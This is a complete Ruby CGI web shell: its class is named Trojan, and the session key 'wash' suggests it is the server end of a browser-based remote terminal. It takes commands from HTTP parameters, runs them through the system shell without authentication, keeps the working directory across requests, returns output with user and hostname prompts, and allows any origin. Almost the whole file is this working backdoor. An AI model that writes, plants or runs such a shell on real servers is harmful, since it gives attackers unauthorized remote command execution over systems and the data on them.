#!/usr/bin/env ruby
require 'cgi'
require 'cgi/session'
require 'cgi/session/pstore'
require 'json'

class Trojan
    attr_accessor :cwd, :response

    def initialize
        # emulate cwd persistence
        @cwd = ($session[:cwd].nil?) ? `pwd`.strip! : $session[:cwd]

        # vivify the response object
        @response = {};
        @response['prompt_context'] = self.get_prompt_context
    end

    def process_command(json)
        # if the specified action was 'shell', pipe the command directly into
        # the web shell.
        if json['action'].first.eql? 'shell'
            process_shell_command(json['cmd'].first)
        # otherwise, simply invoke the method directly
        else
            send json['action'].first, json['args']
        end
    end

    def process_shell_command command
        stdout    = `cd #{@cwd}; #{command} 2>&1; pwd`;
        std_lines = stdout.split("\n");
        @cwd       = std_lines.pop
        stdout    = std_lines.join "\n"

        @response = {
            'output'         => stdout,
            'prompt_context' => self.get_prompt_context,
        }

        $session[:cwd] = @cwd
        self.send_response
    end

    def send_response
        #header('Access-Control-Allow-Origin: *')
        puts @response.to_json
        exit
    end

    def get_prompt_context
        whoami          =  `whoami`.strip!
        hostname        =  `hostname`.strip!
        line_terminator =  (whoami ===  'root') ? '#' : '$';
        return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
    end

    def method_missing method, *args
        @response = {
            'error'          => "#{method} unsupported",
            'output'         => "#{method} unsupported",
            'prompt_context' => self.get_prompt_context
        }
        self.send_response
    end
end

# ---------- Procedural code starts here ----------
cgi      = CGI.new
$session = CGI::Session.new(
    cgi,
    'database_manager' => CGI::Session::PStore,
    'session_key'      => 'wash',
    'session_expires'  => Time.now + 30 * 60,
    'prefix'           => 'wash_pstore_sid_'
)
trojan   = Trojan.new

# can I move this?
puts cgi.header('Access-Control-Allow-Origin: *')
trojan.process_command cgi.params

# save session data
$session.close
